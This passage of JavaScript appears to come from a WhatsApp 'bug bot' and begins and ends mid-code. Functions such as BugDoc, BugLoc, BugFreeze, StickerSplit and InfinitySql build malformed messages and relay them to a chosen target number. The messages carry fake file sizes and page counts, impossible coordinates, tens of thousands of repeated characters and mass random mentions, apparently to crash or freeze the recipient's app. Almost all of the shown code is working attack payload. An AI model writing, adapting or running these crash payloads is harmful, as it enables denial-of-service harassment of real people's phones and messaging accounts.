                  ],
                  forwardingScore: 1,
                  isForwarded: true,
                  fromMe: false,
                  participant: "0@s.whatsapp.net",
                  remoteJid: "status@broadcast",
                  quotedMessage: {
                    documentMessage: {
                      url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                      mimetype:
                        "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                      fileSha256:
                        "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                      fileLength: "9999999999999",
                      pageCount: 1316134911,
                      mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                      fileName: "[🅟_🅛]",
                      fileEncSha256:
                        "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                      directPath:
                        "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                      mediaKeyTimestamp: "1724474503",
                      contactVcard: true,
                      thumbnailDirectPath:
                        "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                      thumbnailSha256:
                        "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                      thumbnailEncSha256:
                        "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                      jpegThumbnail: "",
                    },
                  },
                },
              },
            },
          },
        };
        await sock.relayMessage(jid, messsage, {
          participant: { jid: jid },
          userJid: jid,
          messageId: generateRandomMessageId(),
          ephemeralExpiration: 172800,
        });
      } catch (err) {
        console.log(err);
      }
    }
    //===========================================================================
    //                            FUNCTION TEXT SEND                           //
    //===========================================================================
    async function BugDoc(jid) {
      try {

        let bugDocMsg = (0, lotusbail_2.generateWAMessageFromContent)(
          jid,
          lotusbail_1.proto.Message.fromObject({
            viewOnceMessage: {
              message: {
                interactiveMessage: {
                  header: {
                    title: "[🅟_🅛]‏‎‏‎‏‎‏",
                    documentMessage: {
                      url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
                      mimetype:
                        "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                      fileSha256:
                        "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                      fileLength: "9999999999999",
                      pageCount: 9007199254740991,
                      mediaKey: "EZ/XTztdrMARBwsjTuo9hMH5eRvumy+F8mpLBnaxIaQ=",
                      fileName: `[🅟_🅛]`,
                      fileEncSha256:
                        "oTnfmNW1xNiYhFxohifoE7nJgNZxcCaG15JVsPPIYEg=",
                      directPath:
                        "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
                      mediaKeyTimestamp: "1723855952",
                      contactVcard: true,
                      thumbnailDirectPath:
                        "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                      thumbnailSha256:
                        "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                      thumbnailEncSha256:
                        "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                      jpegThumbnail: "",
                    },
                    hasMediaAttachment: true,
                  },
                  body: {
                    text:
                      "[̡̬̣̯̼͓͈̹͢P̷̷͇̳͔̪̹͉̯̟̟_̷̠̤͓͉̱̹͖̻͓͝L̶̥̤̤̪̜̩͇͟] ̨̣͕͉̫̜ͅI̴̞̦̦̗̥̥͇̰͉͖̭̫̻̜͡Ş̯͕ ̵̶̱͉̳̠͢C̷̢̩͍̳̱̱̖̫̟̺̰͢͠͞Ơ͍̱͎̯̣͕̤̜͍̥͝M͏̨̬̗͍͓̘̣͕͉̫̜ͅI̴̵̞̦̦̗̥͎̲̞̣̥͘N͚̟͉̭̘͎̠̬̜̱̲̮̤͟͞G̷̜͍͚͎̤̀!‏‎‏‎‏‎‏⭑̤\n" +
                      "ꦾ".repeat(33333) +
                      `@0`.repeat(33333),
                  },
                  contextInfo: {
                    mentionedJid: ["0@s.whatsapp.net"],
                    forwardingScore: 1,
                    isForwarded: true,
                    fromMe: false,
                    participant: "0@s.whatsapp.net",
                    remoteJid: "status@broadcast",
                    quotedMessage: {
                      documentMessage: {
                        url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                        mimetype:
                          "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                        fileSha256:
                          "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                        fileLength: "9999999999999",
                        pageCount: 1316134911,
                        mediaKey:
                          "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                        fileName: "[🅟_🅛]",
                        fileEncSha256:
                          "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                        directPath:
                          "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                        mediaKeyTimestamp: "1724474503",
                        contactVcard: true,
                        thumbnailDirectPath:
                          "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                        thumbnailSha256:
                          "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                        thumbnailEncSha256:
                          "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                        jpegThumbnail: "",
                      },
                    },
                  },
                  nativeFlowMessage: {
                    messageParamsJson: {},
                  },
                },
              },
            },
          }),
          { userJid: phoneNum }
        );
        await sock.relayMessage(phoneNum, bugDocMsg.message, {
          messageId: bugDocMsg.key.id,
          participant: { jid: phoneNum },
          userJid: phoneNum,
          mentions: [phoneNum],
        });
      } catch (err) {
        console.log(err);
      }
    }
    async function BugLoc(jid) {
      try {
        const messsage = {
          botInvokeMessage: {
            message: {
              interactiveMessage: {
                header: {
                  title: "[🅟_🅛]‏‎‏‎‏‎‏",
                  locationMessage: {
                    degreesLatitude: -999.03499999999999,
                    degreesLongitude: 922.999999999999,
                    name: "[🅟_🅛]",
                    address: "[̡̬̣̯̼͓͈̹͢P̷̷͇̳͔̪̹͉̯̟̟_̷̠̤͓͉̱̹͖̻͓͝L̶̥̤̤̪̜̩͇͟] ̨̣͕͉̫̜ͅI̴̞̦̦̗̥̥͇̰͉͖̭̫̻̜͡Ş̯͕ ̵̶̱͉̳̠͢C̷̢̩͍̳̱̱̖̫̟̺̰͢͠͞Ơ͍̱͎̯̣͕̤̜͍̥͝M͏̨̬̗͍͓̘̣͕͉̫̜ͅI̴̵̞̦̦̗̥͎̲̞̣̥͘N͚̟͉̭̘͎̠̬̜̱̲̮̤͟͞G̷̜͍͚͎̤̀!‏‎‏‎‏‎‏",
                    jpegThumbnail: "",
                  },
                  hasMediaAttachment: true,
                },
                body: {
                  text:
                    "[̡̬̣̯̼͓͈̹͢P̷̷͇̳͔̪̹͉̯̟̟_̷̠̤͓͉̱̹͖̻͓͝L̶̥̤̤̪̜̩͇͟] ̨̣͕͉̫̜ͅI̴̞̦̦̗̥̥͇̰͉͖̭̫̻̜͡Ş̯͕ ̵̶̱͉̳̠͢C̷̢̩͍̳̱̱̖̫̟̺̰͢͠͞Ơ͍̱͎̯̣͕̤̜͍̥͝M͏̨̬̗͍͓̘̣͕͉̫̜ͅI̴̵̞̦̦̗̥͎̲̞̣̥͘N͚̟͉̭̘͎̠̬̜̱̲̮̤͟͞G̷̜͍͚͎̤̀!⭑̤\n" +
                    "ꦾ".repeat(50000) +
                    `@0`.repeat(50000),
                  mentions: [phoneNum],
                  format: "EXTENSIONS_1",
                },
                contextInfo: {
                  mentionedJid: [
                    "0@s.whatsapp.net",
                    ...Array.from(
                      {
                        length: 30000,
                      },
                      () =>
                        "1" +
                        Math.floor(Math.random() * 500000) +
                        "@s.whatsapp.net"
                    ),
                  ],
                  forwardingScore: 1,
                  isForwarded: true,
                  fromMe: false,
                  participant: "0@s.whatsapp.net",
                  remoteJid: "status@broadcast",
                  quotedMessage: {
                    documentMessage: {
                      url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                      mimetype:
                        "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                      fileSha256:
                        "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                      fileLength: "9999999999999",
                      pageCount: 1316134911,
                      mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                      fileName: "[🅟_🅛]",
                      fileEncSha256:
                        "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                      directPath:
                        "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                      mediaKeyTimestamp: "1724474503",
                      contactVcard: true,
                      thumbnailDirectPath:
                        "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                      thumbnailSha256:
                        "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                      thumbnailEncSha256:
                        "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                      jpegThumbnail: "",
                    },
                  },
                },
                nativeFlowMessage: {
                  name: "call_permission_request",
                  messageParamsJson: "‏‎‏‎‏‎‏",
                },
              },
            },
          },
        };
        await sock.relayMessage(jid, messsage, {
          participant: { jid: jid },
          userJid: jid,
          messageId: generateRandomMessageId(),
          ephemeralExpiration: 172800,
        });
      } catch (err) {
        console.log(err);
      }
    }
    async function BugLiveLoc(jid) {
      try {
        const messsage = {
          botInvokeMessage: {
            message: {
              liveLocationMessage: {
                degreesLatitude: "p",
                degreesLongitude: "p",
                caption: "ꦾ".repeat(50000) + `@0`.repeat(50000),
                sequenceNumber: "0",
                jpegThumbnail: "",
                contextInfo: {
                  mentionedJid: [
                    "0@s.whatsapp.net",
                    ...Array.from(
                      {
                        length: 30000,
                      },
                      () =>
                        "1" +
                        Math.floor(Math.random() * 500000) +
                        "@s.whatsapp.net"
                    ),
                  ],
                  forwardingScore: 1,
                  isForwarded: true,
                  fromMe: false,
                  participant: "0@s.whatsapp.net",
                  remoteJid: "status@broadcast",
                  quotedMessage: {
                    documentMessage: {
                      url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                      mimetype:
                        "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                      fileSha256:
                        "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                      fileLength: "9999999999999",
                      pageCount: 1316134911,
                      mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                      fileName: "[🅟_🅛]",
                      fileEncSha256:
                        "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                      directPath:
                        "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                      mediaKeyTimestamp: "1724474503",
                      contactVcard: true,
                      thumbnailDirectPath:
                        "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                      thumbnailSha256:
                        "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                      thumbnailEncSha256:
                        "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                      jpegThumbnail: "",
                    },
                  },
                },
              },
            },
          },
        };
        await sock.relayMessage(jid, messsage, {
          participant: { jid: jid },
          userJid: jid,
          messageId: generateRandomMessageId(),
          ephemeralExpiration: 172800,
        });
      } catch (err) {
        console.log(err);
      }
    }
    async function BugUI(jid) {
      try {
        const messsage = {
          viewOnceMessage: {
            message: {
              interactiveMessage: {
                header: {
                  title: "[🅟_🅛]‏‎",
                  documentMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
                    mimetype:
                      "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                    fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                    fileLength: "9999999999999",
                    pageCount: 9007199254740991,
                    mediaKey: "EZ/XTztdrMARBwsjTuo9hMH5eRvumy+F8mpLBnaxIaQ=",
                    fileName: `[🅟_🅛]`,
                    fileEncSha256:
                      "oTnfmNW1xNiYhFxohifoE7nJgNZxcCaG15JVsPPIYEg=",
                    directPath:
                      "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1723855952",
                    contactVcard: true,
                    thumbnailDirectPath:
                      "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                    thumbnailSha256:
                      "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                    thumbnailEncSha256:
                      "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                    jpegThumbnail: "",
                  },
                  hasMediaAttachment: true,
                },
                body: {
                  text:
                    "͎[̡̬̣̯̼͓͈̹͢P̷̷͇̳͔̪̹͉̯̟̟_̷̠̤͓͉̱̹͖̻͓͝L̶̥̤̤̪̜̩͇͟] ̨̣͕͉̫̜ͅI̴̞̦̦̗̥̥͇̰͉͖̭̫̻̜͡Ş̯͕ ̵̶̱͉̳̠͢C̷̢̩͍̳̱̱̖̫̟̺̰͢͠͞Ơ͍̱͎̯̣͕̤̜͍̥͝M͏̨̬̗͍͓̘̣͕͉̫̜ͅI̴̵̞̦̦̗̥͎̲̞̣̥͘N͚̟͉̭̘͎̠̬̜̱̲̮̤͟͞G̷̜͍͚͎̤̀!⭑̤\n" +
                    `ꦾ`.repeat(50000) +
                    `@0`.repeat(50000),
                  mentions: ["0@s.whatsapp.net"],
                },
                nativeFlowMessage: {
                  messageParamsJson:
                    '{"name":"galaxy_message","title":"oi","header":" # trashdex - explanation ","body":"xxx"}',
                },
                contextInfo: {
                  mentionedJid: [
                    "0@s.whatsapp.net",
                    ...Array.from(
                      {
                        length: 30000,
                      },
                      () =>
                        "1" +
                        Math.floor(Math.random() * 500000) +
                        "@s.whatsapp.net"
                    ),
                  ],
                  forwardingScore: 1,
                  isForwarded: true,
                  fromMe: false,
                  participant: "0@s.whatsapp.net",
                  remoteJid: "status@broadcast",
                  quotedMessage: {
                    documentMessage: {
                      url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                      mimetype:
                        "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                      fileSha256:
                        "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                      fileLength: "9999999999999",
                      pageCount: 1316134911,
                      mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                      fileName: "[🅟_🅛]",
                      fileEncSha256:
                        "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                      directPath:
                        "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                      mediaKeyTimestamp: "1724474503",
                      contactVcard: true,
                      thumbnailDirectPath:
                        "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                      thumbnailSha256:
                        "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                      thumbnailEncSha256:
                        "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                      jpegThumbnail: "",
                    },
                  },
                },
              },
            },
          },
        };
        await sock.relayMessage(jid, messsage, {
          participant: { jid: jid },
          userJid: jid,
          messageId: generateRandomMessageId(),
          ephemeralExpiration: 172800,
        });
      } catch (err) {
        console.log(err);
      }
    }
async function urlNew(sock, target) {
  await sock.relayMessage(
    target,
    {
      ephemeralMessage: {
        message: {
          locationMessage: {
            degreesLatitude: -9.09999262999,
            degreesLongitude: 199.99963118999,
            jpegThumbnail: null,
            name: "ꦽ".repeat(45000),
            address: "",
            url: "https://fvck.all🩸" + "؂ن؃".repeat(100000) + ".com",
            contextInfo: {
              externalAdReply: {
                quotedAd: {
                  advertiserName: " ؂ن؃".repeat(10000),
                  mediaType: "IMAGE",
                  jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/",
                  caption: "",
                },
                placeholderKey: {
                  remoteJid: "0@s.whatsapp.net",
                  fromMe: false,
                  id: "ABCDEF1234567890",
                },
              },
              quotedMessage: {
                paymentInviteMessage: {
                  serviceType: 3,
                  expiryTimestamp: Date.now() + 1814400000,
                },
                forwardedAiBotMessageInfo: {
                  botName: "META AI",
                  botJid:
                    Math.floor(Math.random() * 5000000) +
                    "@s.whatsapp.net",
                  creatorName: "Bot",
                },
              },
            },
          },
        },
      },
    },
    { participant: { jid: target } }
  );
}
    async function BugFreeze(jid) {
      try {
        const messsage = {
          botInvokeMessage: {
            message: {
              interactiveMessage: {
                header: {
                  documentMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
                    mimetype:
                      "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                    fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                    fileLength: "9999999999999",
                    pageCount: 1316134911,
                    mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
                    fileName: "[獭廷态蹋摊碳蛽蛨坦P谭谭蛧坛蛿酞坦蛪摊虩虩_蜐谭虪踏蛽蛪瘫坦蜄袒蛽L潭蜔胎踏踏酞虦泰蛧] 台蹋蛥蜁蛪太虦I檀虨苔苔虠胎汀胎蛧贪蛪蜄汰太袒虦S抬摊蜁 痰廷潭瘫蛪坛虪C挞蜖泰蛵坛瘫廷蜑谭瘫號太虩毯贪O蜐蛵瘫蛶摊蹋蜁踏虦虥蛵胎M蛷态虠蛵蛽虡台蹋蛥蜁蛪太虦I檀虨苔苔虠胎痰蜆蛶滩虨蹋胎N蜔蜌虩蛪汰虡蜑蛶虪态虦瘫滩坍踏G蛝谭虦蛵蜌蛶踏!鉄喬�",
                    fileEncSha256:
                      "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
                    directPath:
                      "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1726867151",
                    contactVcard: true,
                    jpegThumbnail: "",
                  },
                  hasMediaAttachment: true,
                },
                body: {
                  text:
                    "[獭廷态蹋摊碳蛽蛨坦P谭谭蛧坛蛿酞坦蛪摊虩虩_蜐谭虪踏蛽蛪瘫坦蜄袒蛽L潭蜔胎踏踏酞虦泰蛧] 台蹋蛥蜁蛪太虦I檀虨苔苔虠胎汀胎蛧贪蛪蜄汰太袒虦S抬摊蜁 痰廷潭瘫蛪坛虪C挞蜖泰蛵坛瘫廷蜑谭瘫號太虩毯贪O蜐蛵瘫蛶摊蹋蜁踏虦虥蛵胎M蛷态虠蛵蛽虡台蹋蛥蜁蛪太虦I檀虨苔苔虠胎痰蜆蛶滩虨蹋胎N蜔蜌虩蛪汰虡蜑蛶虪态虦瘫滩坍踏G蛝谭虦蛵蜌蛶踏!鉄喬�" +
                    "軎�".repeat(50000) +
                    "@0".repeat(50000),
                },
                footer: { text: "" },
                nativeFlowMessage: {},
                contextInfo: {
                  mentionedJid: [
                    "0@s.whatsapp.net",
                    ...Array.from(
                      {
                        length: 30000,
                      },
                      () =>
                        "1" +
                        Math.floor(Math.random() * 500000) +
                        "@s.whatsapp.net"
                    ),
                  ],
                  forwardingScore: 1,
                  isForwarded: true,
                  fromMe: false,
                  participant: "0@s.whatsapp.net",
                  remoteJid: "status@broadcast",
                  quotedMessage: {
                    documentMessage: {
                      url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                      mimetype:
                        "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                      fileSha256:
                        "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                      fileLength: "9999999999999",
                      pageCount: 1316134911,
                      mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                      fileName: "[獭廷态蹋摊碳蛽蛨坦P谭谭蛧坛蛿酞坦蛪摊虩虩_蜐谭虪踏蛽蛪瘫坦蜄袒蛽L潭蜔胎踏踏酞虦泰蛧] 台蹋蛥蜁蛪太虦I檀虨苔苔虠胎汀胎蛧贪蛪蜄汰太袒虦S抬摊蜁 痰廷潭瘫蛪坛虪C挞蜖泰蛵坛瘫廷蜑谭瘫號太虩毯贪O蜐蛵瘫蛶摊蹋蜁踏虦虥蛵胎M蛷态虠蛵蛽虡台蹋蛥蜁蛪太虦I檀虨苔苔虠胎痰蜆蛶滩虨蹋胎N蜔蜌虩蛪汰虡蜑蛶虪态虦瘫滩坍踏G蛝谭虦蛵蜌蛶踏!鉄喬�",
                      fileEncSha256:
                        "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                      directPath:
                        "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                      mediaKeyTimestamp: "1724474503",
                      contactVcard: true,
                      thumbnailDirectPath:
                        "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                      thumbnailSha256:
                        "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                      thumbnailEncSha256:
                        "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                      jpegThumbnail: "",
                    },
                  },
                },
              },
            },
          },
        };
        await sock.relayMessage(jid, messsage, {
          participant: { jid: jid },
          userJid: jid,
          messageId: generateRandomMessageId(),
          ephemeralExpiration: 172800,
        });
      } catch (err) {
        console.log(err);
      }
    }
async function StickerSplit(sock, target) {
  const stickerPayload = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c&mms3=true",
          fileSha256: "mtc9ZjQDjIBETj76yZe6ZdsS6fGYL+5L7a/SS6YjJGs=",
          fileEncSha256: "tvK/hsfLhjWW7T6BkBJZKbNLlKGjxy6M6tIZJaUTXo8=",
          mediaKey: "ml2maI4gu55xBZrd1RfkVYZbL424l0WPeXWtQ/cYrLc=",
          mimetype: "image/webp",
          height: 9999,
          width: 9999,
          directPath: "/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c",
          fileLength: 12260,
          mediaKeyTimestamp: "1743832131",
          isAnimated: false,
          stickerSentTs: Date.now(),
          isAvatar: false,
          isAiSticker: false,
          isLottie: false,
          contextInfo: {
            participant: target,
            mentionedJid: [
              target,
              ...Array.from(
                { length: 1900 },
                () =>
                  "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
              ),
            ],
            remoteJid: "X",
            participant: target,
            stanzaId: "1234567890ABCDEF",
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 3,
                expiryTimestamp: Date.now() + 1814400000
              }
            }
          }
        }
      }
    }
  };
  const msg = generateWAMessageFromContent(target, stickerPayload, {});
  if (Math.random() > 0.5) {
    await sock.relayMessage("status@broadcast", msg.message, {
      messageId: msg.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                { tag: "to", attrs: { jid: target }, content: undefined }
              ]
            }
          ]
        }
      ]
    });
  } else {
    await sock.relayMessage(target, msg.message, { messageId: msg.key.id });
  }
}
async function InfinitySql(sock, target) {
  try {
    let message = {
      interactiveMessage: {
        body: { text: "> *ALOW*" },
        nativeFlowMessage: {
          buttons: [
            {
              name: "payment_method",
              buttonParamsJson: `{\"reference_id\":null,\"payment_method\":${"\u0010".repeat(0x2710)},\"payment_timestamp\":null,\"share_payment_status\":true}`,
            },
          ],
          messageParamsJson: "{}",
        },
      },
    };
    for (let iterator = 0; iterator < 1; iterator++) {
      const msg = generateWAMessageFromContent(target, message, {});
      await sock.relayMessage(target, msg.message, {
        additionalNodes: [
          { tag: "biz", attrs: { native_flow_name: "payment_method" } },
        ],
        messageId: msg.key.id,
        participant: { jid: target },
        userJid: target,
      });
      await sock.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
          {
            tag: "meta",
            attrs: { native_flow_name: "payment_method" },
            content: [
              {
                tag: "mentioned_users",
                attrs: {},
                content: [
                  {
                    tag: "to",
                    attrs: { jid: target },
                    content: undefined,
                  },
                ],
              },
            ],
          },
        ],
      });
      await new Promise((resolve) => setTimeout(resolve, 500));
    }
  } catch (err) {
    console.error(chalk.red(err));
  }
}
async function pollingBugs(xrelly, target) {
const mediaBuffer1 = null;
const mediaBuffer2 = null;
function toHash(buffer) {
  return crypto.createHash("sha256").update(buffer).digest();
}
const name = "Icha cantikϟ\n\n";
const options = [];
for (let r = 0; r < 19; r++) {
